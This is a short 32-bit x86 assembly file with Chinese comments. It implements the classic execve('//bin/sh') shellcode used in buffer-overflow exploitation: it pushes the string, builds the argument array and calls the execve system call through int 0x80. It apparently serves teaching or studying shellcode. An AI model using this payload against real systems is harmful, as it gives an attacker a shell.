.section .text 
.globl _start 
_start: 

  # 执行execve
  xorl %eax,%eax 
  pushl %eax 
  # 下面两行直接把/bin/sh这7字符串入栈，因为下面为两次4字节入栈，所以实际入栈的是//bin/sh
  pushl $0x68732f6e 
  pushl $0x69622f2f 
  movl %esp,%ebx 
  pushl %eax 
  pushl %ebx 
  movl %esp,%ecx 
  movb $0xb,%al 
  int $0x80
